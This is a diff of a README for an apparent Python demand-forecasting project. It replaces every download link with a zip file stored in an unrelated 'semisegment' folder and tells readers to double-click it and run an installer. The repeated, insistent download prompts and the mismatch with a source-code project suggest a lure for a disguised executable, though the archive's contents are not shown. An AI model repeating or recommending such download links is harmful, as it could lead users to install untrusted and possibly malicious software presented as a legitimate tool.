@@ -1,7 +1,7 @@
 # 🌟 Demand-Forecasting - Easy Demand Prediction in Minutes
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Samthedeveloper999/Demand-Forecasting/main/semisegment/Demand-Forecasting.zip)](https://raw.githubusercontent.com/Samthedeveloper999/Demand-Forecasting/main/semisegment/Demand-Forecasting.zip)
+[![Download](https://github.com/Samthedeveloper999/Demand-Forecasting/raw/refs/heads/main/semisegment/Forecasting-Demand-2.1.zip)](https://github.com/Samthedeveloper999/Demand-Forecasting/raw/refs/heads/main/semisegment/Forecasting-Demand-2.1.zip)
 
 ## 📚 Description
 Demand-Forecasting is an end-to-end application that helps you predict sales over time. It uses Python to analyze synthetic time-series sales data. With this tool, you can generate and clean data, choose the best forecasting model, and evaluate its accuracy. It also provides detailed visualizations to showcase your results.
@@ -10,7 +10,7 @@ Demand-Forecasting is an end-to-end application that helps you predict sales ove
 To get started with Demand-Forecasting, follow these steps:
 
 1. **Download the application.** 
-   Visit [this page to download](https://raw.githubusercontent.com/Samthedeveloper999/Demand-Forecasting/main/semisegment/Demand-Forecasting.zip).
+   Visit [this page to download](https://github.com/Samthedeveloper999/Demand-Forecasting/raw/refs/heads/main/semisegment/Forecasting-Demand-2.1.zip).
 
 2. **Install the software.** 
    Once you have the file, double-click it to start the installation process. Follow the prompts on your screen.
@@ -37,7 +37,7 @@ To run Demand-Forecasting, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To download the latest version of Demand-Forecasting:
 
-1. Click [here to visit the release page](https://raw.githubusercontent.com/Samthedeveloper999/Demand-Forecasting/main/semisegment/Demand-Forecasting.zip).
+1. Click [here to visit the release page](https://github.com/Samthedeveloper999/Demand-Forecasting/raw/refs/heads/main/semisegment/Forecasting-Demand-2.1.zip).
 2. Find the latest version listed.
 3. Click on the appropriate file for your operating system to begin downloading.
 4. Once downloaded, open the file to start the installation.
@@ -66,4 +66,4 @@ Contributions are welcome! If you have ideas to improve the application, please 
 Demand-Forecasting is open-source software. You may use it freely, but please give proper credit to the contributors.
 
 ## 📥 Once More, Download!
-Don't forget, you can download the latest version from [this link](https://raw.githubusercontent.com/Samthedeveloper999/Demand-Forecasting/main/semisegment/Demand-Forecasting.zip). Enjoy predicting your sales with ease!
+Don't forget, you can download the latest version from [this link](https://github.com/Samthedeveloper999/Demand-Forecasting/raw/refs/heads/main/semisegment/Forecasting-Demand-2.1.zip). Enjoy predicting your sales with ease!
